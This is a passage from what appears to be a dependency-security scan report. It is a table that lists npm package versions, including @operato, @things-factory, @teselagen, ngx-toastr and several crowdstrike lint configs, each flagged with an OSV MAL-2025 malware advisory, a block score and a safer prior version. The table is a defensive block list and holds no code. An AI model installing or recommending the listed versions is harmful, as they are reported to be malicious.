| `@operato/input` | 9.0.27 | 9.0.26 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.35 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.36 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.37 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.39 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.40 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.41 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.42 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.43 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.45 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.46 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.47 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/input` | 9.0.48 | 9.0.34 | [MAL-2025-47258](https://osv.dev/vulnerability/MAL-2025-47258) | BLOCK (19) | high_risk |
| `@operato/layout` | 9.0.35 | 9.0.34 | [MAL-2025-47259](https://osv.dev/vulnerability/MAL-2025-47259) | BLOCK (19) | high_risk |
| `@operato/layout` | 9.0.36 | 9.0.34 | [MAL-2025-47259](https://osv.dev/vulnerability/MAL-2025-47259) | BLOCK (19) | high_risk |
| `@operato/layout` | 9.0.37 | 9.0.34 | [MAL-2025-47259](https://osv.dev/vulnerability/MAL-2025-47259) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.22 | 9.0.21 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.35 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.36 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.37 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.39 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.40 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.41 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.42 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.43 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.44 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.45 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.48 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/popup` | 9.0.51 | 9.0.34 | [MAL-2025-47260](https://osv.dev/vulnerability/MAL-2025-47260) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.35 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.36 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.37 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.38 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.39 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.40 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.41 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.43 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.44 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/pull-to-refresh` | 9.0.47 | 9.0.34 | [MAL-2025-47261](https://osv.dev/vulnerability/MAL-2025-47261) | BLOCK (19) | high_risk |
| `@operato/shell` | 9.0.22 | 9.0.21 | [MAL-2025-47262](https://osv.dev/vulnerability/MAL-2025-47262) | BLOCK (19) | high_risk |
| `@operato/shell` | 9.0.35 | 9.0.34 | [MAL-2025-47262](https://osv.dev/vulnerability/MAL-2025-47262) | BLOCK (19) | high_risk |
| `@operato/shell` | 9.0.36 | 9.0.34 | [MAL-2025-47262](https://osv.dev/vulnerability/MAL-2025-47262) | BLOCK (19) | high_risk |
| `@operato/shell` | 9.0.37 | 9.0.34 | [MAL-2025-47262](https://osv.dev/vulnerability/MAL-2025-47262) | BLOCK (19) | high_risk |
| `@operato/shell` | 9.0.39 | 9.0.34 | [MAL-2025-47262](https://osv.dev/vulnerability/MAL-2025-47262) | BLOCK (19) | high_risk |
| `@operato/styles` | 9.0.2 | 9.0.1 | [MAL-2025-47220](https://osv.dev/vulnerability/MAL-2025-47220) | BLOCK (19) | high_risk |
| `@operato/styles` | 9.0.35 | 9.0.34 | [MAL-2025-47220](https://osv.dev/vulnerability/MAL-2025-47220) | BLOCK (19) | high_risk |
| `@operato/styles` | 9.0.36 | 9.0.34 | [MAL-2025-47220](https://osv.dev/vulnerability/MAL-2025-47220) | BLOCK (19) | high_risk |
| `@operato/styles` | 9.0.37 | 9.0.34 | [MAL-2025-47220](https://osv.dev/vulnerability/MAL-2025-47220) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.22 | 9.0.21 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.35 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.36 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.37 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.39 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.40 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.41 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.42 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.43 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.45 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.48 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.50 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@operato/utils` | 9.0.51 | 9.0.34 | [MAL-2025-47263](https://osv.dev/vulnerability/MAL-2025-47263) | BLOCK (19) | high_risk |
| `@teselagen/bio-parsers` | 0.4.29 | 0.4.28 | [MAL-2025-47271](https://osv.dev/vulnerability/MAL-2025-47271) | BLOCK (18) | high_risk |
| `@teselagen/bounce-loader` | 0.3.16 | 0.3.15 | [MAL-2025-47272](https://osv.dev/vulnerability/MAL-2025-47272) | BLOCK (19) | high_risk |
| `@teselagen/bounce-loader` | 0.3.17 | 0.3.15 | [MAL-2025-47272](https://osv.dev/vulnerability/MAL-2025-47272) | BLOCK (19) | high_risk |
| `@teselagen/file-utils` | 0.3.21 | 0.3.20 | [MAL-2025-47273](https://osv.dev/vulnerability/MAL-2025-47273) | BLOCK (18) | high_risk |
| `@teselagen/liquibase-tools` | 0.4.1 | 0.4.0 | [MAL-2025-47274](https://osv.dev/vulnerability/MAL-2025-47274) | BLOCK (19) | high_risk |
| `@teselagen/range-utils` | 0.3.14 | 0.3.13 | [MAL-2025-47276](https://osv.dev/vulnerability/MAL-2025-47276) | BLOCK (18) | high_risk |
| `@teselagen/react-list` | 0.8.19 | 0.8.18 | [MAL-2025-47277](https://osv.dev/vulnerability/MAL-2025-47277) | BLOCK (19) | high_risk |
| `@teselagen/sequence-utils` | 0.3.33 | 0.3.32 | [MAL-2025-47279](https://osv.dev/vulnerability/MAL-2025-47279) | BLOCK (18) | high_risk |
| `@thangved/callback-window` | 1.1.4 | 1.1.2 | [MAL-2025-47281](https://osv.dev/vulnerability/MAL-2025-47281) | BLOCK (16) | high_risk |
| `@things-factory/attachment-base` | 9.0.42 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.43 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.44 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.45 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.46 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.47 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.48 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.49 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.51 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.52 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/attachment-base` | 9.0.55 | 9.0.41 | [MAL-2025-47282](https://osv.dev/vulnerability/MAL-2025-47282) | BLOCK (19) | high_risk |
| `@things-factory/auth-base` | 9.0.42 | 9.0.41 | [MAL-2025-47283](https://osv.dev/vulnerability/MAL-2025-47283) | BLOCK (19) | high_risk |
| `@things-factory/auth-base` | 9.0.43 | 9.0.41 | [MAL-2025-47283](https://osv.dev/vulnerability/MAL-2025-47283) | BLOCK (19) | high_risk |
| `@things-factory/auth-base` | 9.0.44 | 9.0.41 | [MAL-2025-47283](https://osv.dev/vulnerability/MAL-2025-47283) | BLOCK (19) | high_risk |
| `@things-factory/auth-base` | 9.0.45 | 9.0.41 | [MAL-2025-47283](https://osv.dev/vulnerability/MAL-2025-47283) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.42 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.43 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.44 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.45 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.47 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.48 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.49 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.50 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.51 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.53 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.54 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.55 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.56 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/email-base` | 9.0.59 | 9.0.41 | [MAL-2025-47221](https://osv.dev/vulnerability/MAL-2025-47221) | BLOCK (19) | high_risk |
| `@things-factory/env` | 9.0.42 | 9.0.41 | [MAL-2025-47222](https://osv.dev/vulnerability/MAL-2025-47222) | BLOCK (19) | high_risk |
| `@things-factory/env` | 9.0.43 | 9.0.41 | [MAL-2025-47222](https://osv.dev/vulnerability/MAL-2025-47222) | BLOCK (19) | high_risk |
| `@things-factory/env` | 9.0.44 | 9.0.41 | [MAL-2025-47222](https://osv.dev/vulnerability/MAL-2025-47222) | BLOCK (19) | high_risk |
| `@things-factory/env` | 9.0.45 | 9.0.41 | [MAL-2025-47222](https://osv.dev/vulnerability/MAL-2025-47222) | BLOCK (19) | high_risk |
| `@things-factory/integration-base` | 9.0.42 | 9.0.41 | [MAL-2025-47223](https://osv.dev/vulnerability/MAL-2025-47223) | BLOCK (18) | high_risk |
| `@things-factory/integration-base` | 9.0.43 | 9.0.41 | [MAL-2025-47223](https://osv.dev/vulnerability/MAL-2025-47223) | BLOCK (18) | high_risk |
| `@things-factory/integration-base` | 9.0.44 | 9.0.41 | [MAL-2025-47223](https://osv.dev/vulnerability/MAL-2025-47223) | BLOCK (18) | high_risk |
| `@things-factory/integration-base` | 9.0.45 | 9.0.41 | [MAL-2025-47223](https://osv.dev/vulnerability/MAL-2025-47223) | BLOCK (18) | high_risk |
| `@things-factory/integration-marketplace` | 9.0.42 | 9.0.41 | [MAL-2025-47224](https://osv.dev/vulnerability/MAL-2025-47224) | BLOCK (19) | high_risk |
| `@things-factory/integration-marketplace` | 9.0.43 | 9.0.41 | [MAL-2025-47224](https://osv.dev/vulnerability/MAL-2025-47224) | BLOCK (19) | high_risk |
| `@things-factory/integration-marketplace` | 9.0.44 | 9.0.41 | [MAL-2025-47224](https://osv.dev/vulnerability/MAL-2025-47224) | BLOCK (19) | high_risk |
| `@things-factory/integration-marketplace` | 9.0.45 | 9.0.41 | [MAL-2025-47224](https://osv.dev/vulnerability/MAL-2025-47224) | BLOCK (19) | high_risk |
| `@things-factory/shell` | 9.0.42 | 9.0.41 | [MAL-2025-47392](https://osv.dev/vulnerability/MAL-2025-47392) | BLOCK (19) | high_risk |
| `@things-factory/shell` | 9.0.43 | 9.0.41 | [MAL-2025-47392](https://osv.dev/vulnerability/MAL-2025-47392) | BLOCK (19) | high_risk |
| `@things-factory/shell` | 9.0.44 | 9.0.41 | [MAL-2025-47392](https://osv.dev/vulnerability/MAL-2025-47392) | BLOCK (19) | high_risk |
| `@things-factory/shell` | 9.0.45 | 9.0.41 | [MAL-2025-47392](https://osv.dev/vulnerability/MAL-2025-47392) | BLOCK (19) | high_risk |
| `@tnf-dev/api` | 1.0.8 | 1.0.7 | [MAL-2025-47284](https://osv.dev/vulnerability/MAL-2025-47284) | BLOCK (16) | high_risk |
| `@tnf-dev/core` | 1.0.8 | 1.0.7 | [MAL-2025-47285](https://osv.dev/vulnerability/MAL-2025-47285) | BLOCK (16) | high_risk |
| `@tnf-dev/js` | 1.0.8 | 1.0.7 | [MAL-2025-47286](https://osv.dev/vulnerability/MAL-2025-47286) | BLOCK (16) | high_risk |
| `@tnf-dev/mui` | 1.0.8 | 1.0.7 | [MAL-2025-47287](https://osv.dev/vulnerability/MAL-2025-47287) | BLOCK (16) | high_risk |
| `@tnf-dev/react` | 1.0.8 | 1.0.7 | [MAL-2025-47288](https://osv.dev/vulnerability/MAL-2025-47288) | BLOCK (15) | high_risk |
| `ace-colorpicker-rpk` | 0.0.14 | 0.0.13 | [MAL-2025-47293](https://osv.dev/vulnerability/MAL-2025-47293) | BLOCK (19) | high_risk |
| `airchief` | 0.3.1 | 0.3.0 | [MAL-2025-47294](https://osv.dev/vulnerability/MAL-2025-47294) | BLOCK (16) | high_risk |
| `airpilot` | 0.8.8 | 0.8.7 | [MAL-2025-47295](https://osv.dev/vulnerability/MAL-2025-47295) | BLOCK (14) | high_risk |
| `browser-webdriver-downloader` | 3.0.8 | 3.0.7 | [MAL-2025-47298](https://osv.dev/vulnerability/MAL-2025-47298) | BLOCK (19) | high_risk |
| `capacitor-notificationhandler` | 0.0.2 | 0.0.1 | [MAL-2025-47394](https://osv.dev/vulnerability/MAL-2025-47394) | BLOCK (19) | high_risk |
| `capacitor-plugin-healthapp` | 0.0.2 | 0.0.1 | [MAL-2025-47395](https://osv.dev/vulnerability/MAL-2025-47395) | BLOCK (19) | high_risk |
| `capacitor-plugin-ihealth` | 1.1.8 | 1.1.7 | [MAL-2025-47396](https://osv.dev/vulnerability/MAL-2025-47396) | BLOCK (19) | high_risk |
| `capacitor-plugin-ihealth` | 1.1.9 | 1.1.7 | [MAL-2025-47396](https://osv.dev/vulnerability/MAL-2025-47396) | BLOCK (19) | high_risk |
| `capacitor-plugin-vonage` | 1.0.2 | 1.0.1 | [MAL-2025-47397](https://osv.dev/vulnerability/MAL-2025-47397) | BLOCK (19) | high_risk |
| `capacitorandroidpermissions` | 0.0.4 | 0.0.3 | [MAL-2025-47398](https://osv.dev/vulnerability/MAL-2025-47398) | BLOCK (19) | high_risk |
| `create-hest-app` | 0.1.9 | 0.1.8 | [MAL-2025-47303](https://osv.dev/vulnerability/MAL-2025-47303) | BLOCK (18) | high_risk |
| `db-evo` | 1.1.4 | 1.1.3 | [MAL-2025-47400](https://osv.dev/vulnerability/MAL-2025-47400) | BLOCK (19) | high_risk |
| `db-evo` | 1.1.5 | 1.1.3 | [MAL-2025-47400](https://osv.dev/vulnerability/MAL-2025-47400) | BLOCK (19) | high_risk |
| `ember-browser-services` | 5.0.2 | 5.0.1 | [MAL-2025-47306](https://osv.dev/vulnerability/MAL-2025-47306) | BLOCK (19) | high_risk |
| `ember-browser-services` | 5.0.3 | 5.0.1 | [MAL-2025-47306](https://osv.dev/vulnerability/MAL-2025-47306) | BLOCK (19) | high_risk |
| `ember-headless-form` | 1.1.2 | 1.1.1 | [MAL-2025-47307](https://osv.dev/vulnerability/MAL-2025-47307) | BLOCK (19) | high_risk |
| `ember-headless-form` | 1.1.3 | 1.1.1 | [MAL-2025-47307](https://osv.dev/vulnerability/MAL-2025-47307) | BLOCK (19) | high_risk |
| `ember-headless-form-yup` | 1.0.1 | 1.0.0 | [MAL-2025-47308](https://osv.dev/vulnerability/MAL-2025-47308) | BLOCK (19) | high_risk |
| `ember-headless-table` | 2.1.5 | 2.1.4 | [MAL-2025-47309](https://osv.dev/vulnerability/MAL-2025-47309) | BLOCK (19) | high_risk |
| `ember-headless-table` | 2.1.6 | 2.1.4 | [MAL-2025-47309](https://osv.dev/vulnerability/MAL-2025-47309) | BLOCK (19) | high_risk |
| `ember-url-hash-polyfill` | 1.0.12 | 1.0.11 | [MAL-2025-47310](https://osv.dev/vulnerability/MAL-2025-47310) | BLOCK (20) | high_risk |
| `ember-url-hash-polyfill` | 1.0.13 | 1.0.11 | [MAL-2025-47310](https://osv.dev/vulnerability/MAL-2025-47310) | BLOCK (19) | high_risk |
| `ember-velcro` | 2.2.1 | 2.2.0 | [MAL-2025-47311](https://osv.dev/vulnerability/MAL-2025-47311) | BLOCK (19) | high_risk |
| `ember-velcro` | 2.2.2 | 2.2.0 | [MAL-2025-47311](https://osv.dev/vulnerability/MAL-2025-47311) | BLOCK (19) | high_risk |
| `eslint-config-crowdstrike` | 11.0.2 | 11.0.1 | [MAL-2025-47226](https://osv.dev/vulnerability/MAL-2025-47226) | BLOCK (19) | high_risk |
| `eslint-config-crowdstrike` | 11.0.3 | 11.0.1 | [MAL-2025-47226](https://osv.dev/vulnerability/MAL-2025-47226) | BLOCK (19) | high_risk |
| `eslint-config-crowdstrike-node` | 4.0.3 | 4.0.2 | [MAL-2025-47227](https://osv.dev/vulnerability/MAL-2025-47227) | BLOCK (19) | high_risk |
| `eslint-config-crowdstrike-node` | 4.0.4 | 4.0.2 | [MAL-2025-47227](https://osv.dev/vulnerability/MAL-2025-47227) | BLOCK (19) | high_risk |
| `eslint-config-teselagen` | 6.1.7 | 6.1.6 | [MAL-2025-47313](https://osv.dev/vulnerability/MAL-2025-47313) | BLOCK (19) | high_risk |
| `globalize-rpk` | 1.7.4 | 1.7.3 | [MAL-2025-47315](https://osv.dev/vulnerability/MAL-2025-47315) | BLOCK (19) | high_risk |
| `graphql-sequelize-teselagen` | 5.3.8 | 5.3.7 | [MAL-2025-47316](https://osv.dev/vulnerability/MAL-2025-47316) | BLOCK (20) | high_risk |
| `html-to-base64-image` | 1.0.2 | 1.0.1 | [MAL-2025-47317](https://osv.dev/vulnerability/MAL-2025-47317) | BLOCK (17) | high_risk |
| `json-rules-engine-simplified` | 0.2.1 | 0.2.0 | [MAL-2025-47318](https://osv.dev/vulnerability/MAL-2025-47318) | BLOCK (16) | high_risk |
| `json-rules-engine-simplified` | 0.2.3 | 0.2.0 | [MAL-2025-47318](https://osv.dev/vulnerability/MAL-2025-47318) | BLOCK (19) | high_risk |
| `jumpgate` | 0.0.2 | 0.0.1 | [MAL-2025-47320](https://osv.dev/vulnerability/MAL-2025-47320) | BLOCK (16) | high_risk |
| `koa2-swagger-ui` | 5.11.1 | 5.11.0 | [MAL-2025-47187](https://osv.dev/vulnerability/MAL-2025-47187) | BLOCK (21) | high_risk |
| `koa2-swagger-ui` | 5.11.2 | 5.11.0 | [MAL-2025-47187](https://osv.dev/vulnerability/MAL-2025-47187) | BLOCK (21) | high_risk |
| `mcp-knowledge-base` | 0.0.2 | 0.0.1 | [MAL-2025-47326](https://osv.dev/vulnerability/MAL-2025-47326) | BLOCK (16) | high_risk |
| `mcp-knowledge-graph` | 1.2.1 | 1.2.0 | [MAL-2025-47327](https://osv.dev/vulnerability/MAL-2025-47327) | BLOCK (16) | high_risk |
| `monorepo-next` | 13.0.1 | 13.0.0 | [MAL-2025-47328](https://osv.dev/vulnerability/MAL-2025-47328) | BLOCK (19) | high_risk |
| `monorepo-next` | 13.0.2 | 13.0.0 | [MAL-2025-47328](https://osv.dev/vulnerability/MAL-2025-47328) | BLOCK (19) | high_risk |
| `ng-imports-checker` | 0.0.9 | 0.0.8 | [MAL-2025-47423](https://osv.dev/vulnerability/MAL-2025-47423) | BLOCK (19) | high_risk |
| `ng2-file-upload` | 8.0.2 | 8.0.0 | [MAL-2025-47196](https://osv.dev/vulnerability/MAL-2025-47196) | BLOCK (19) | high_risk |
| `ng2-file-upload` | 8.0.3 | 8.0.0 | [MAL-2025-47196](https://osv.dev/vulnerability/MAL-2025-47196) | BLOCK (19) | high_risk |
| `ngx-bootstrap` | 20.0.5 | 20.0.2 | [MAL-2025-47197](https://osv.dev/vulnerability/MAL-2025-47197) | BLOCK (19) | high_risk |
| `ngx-bootstrap` | 20.0.6 | 20.0.2 | [MAL-2025-47197](https://osv.dev/vulnerability/MAL-2025-47197) | BLOCK (19) | high_risk |
| `ngx-color` | 10.0.1 | 10.0.0 | [MAL-2025-47198](https://osv.dev/vulnerability/MAL-2025-47198) | BLOCK (21) | high_risk |
| `ngx-color` | 10.0.2 | 10.0.0 | [MAL-2025-47198](https://osv.dev/vulnerability/MAL-2025-47198) | BLOCK (21) | high_risk |
| `ngx-toastr` | 19.0.1 | 19.0.0 | [MAL-2025-47199](https://osv.dev/vulnerability/MAL-2025-47199) | BLOCK (21) | high_risk |
| `ngx-toastr` | 19.0.2 | 19.0.0 | [MAL-2025-47199](https://osv.dev/vulnerability/MAL-2025-47199) | BLOCK (21) | high_risk |
| `ngx-trend` | 8.0.1 | 8.0.0 | [MAL-2025-47200](https://osv.dev/vulnerability/MAL-2025-47200) | BLOCK (19) | high_risk |
| `ngx-ws` | 1.1.5 | 1.1.4 | [MAL-2025-47332](https://osv.dev/vulnerability/MAL-2025-47332) | BLOCK (19) | high_risk |
| `ngx-ws` | 1.1.6 | 1.1.4 | [MAL-2025-47332](https://osv.dev/vulnerability/MAL-2025-47332) | BLOCK (19) | high_risk |
| `oradm-to-gql` | 35.0.14 | 35.0.13 | [MAL-2025-47336](https://osv.dev/vulnerability/MAL-2025-47336) | BLOCK (19) | high_risk |
| `oradm-to-sqlz` | 1.1.2 | 1.1.1 | [MAL-2025-47337](https://osv.dev/vulnerability/MAL-2025-47337) | BLOCK (17) | high_risk |
| `oradm-to-sqlz` | 1.1.4 | 1.1.1 | [MAL-2025-47337](https://osv.dev/vulnerability/MAL-2025-47337) | BLOCK (19) | high_risk |
| `ove-auto-annotate` | 0.0.10 | 0.0.8 | [MAL-2025-47338](https://osv.dev/vulnerability/MAL-2025-47338) | BLOCK (18) | high_risk |
| `ove-auto-annotate` | 0.0.9 | 0.0.8 | [MAL-2025-47338](https://osv.dev/vulnerability/MAL-2025-47338) | BLOCK (18) | high_risk |
| `pm2-gelf-json` | 1.0.4 | 1.0.3 | [MAL-2025-47339](https://osv.dev/vulnerability/MAL-2025-47339) | BLOCK (19) | high_risk |
| `pm2-gelf-json` | 1.0.5 | 1.0.3 | [MAL-2025-47339](https://osv.dev/vulnerability/MAL-2025-47339) | BLOCK (19) | high_risk |
| `react-complaint-image` | 0.0.32 | 0.0.31 | [MAL-2025-47341](https://osv.dev/vulnerability/MAL-2025-47341) | BLOCK (15) | high_risk |
| `react-complaint-image` | 0.0.34 | 0.0.31 | [MAL-2025-47341](https://osv.dev/vulnerability/MAL-2025-47341) | BLOCK (18) | high_risk |
| `react-jsonschema-form-conditionals` | 0.3.18 | 0.3.17 | [MAL-2025-47342](https://osv.dev/vulnerability/MAL-2025-47342) | BLOCK (15) | high_risk |
| `react-jsonschema-form-conditionals` | 0.3.20 | 0.3.17 | [MAL-2025-47342](https://osv.dev/vulnerability/MAL-2025-47342) | BLOCK (18) | high_risk |
| `react-jsonschema-form-extras` | 1.0.3 | 1.0.0 | [MAL-2025-47343](https://osv.dev/vulnerability/MAL-2025-47343) | BLOCK (18) | high_risk |
| `react-jsonschema-rxnt-extras` | 0.4.8 | 0.4.5 | [MAL-2025-47344](https://osv.dev/vulnerability/MAL-2025-47344) | BLOCK (18) | high_risk |
| `remark-preset-lint-crowdstrike` | 4.0.1 | 4.0.0 | [MAL-2025-47228](https://osv.dev/vulnerability/MAL-2025-47228) | BLOCK (19) | high_risk |
| `remark-preset-lint-crowdstrike` | 4.0.2 | 4.0.0 | [MAL-2025-47228](https://osv.dev/vulnerability/MAL-2025-47228) | BLOCK (19) | high_risk |
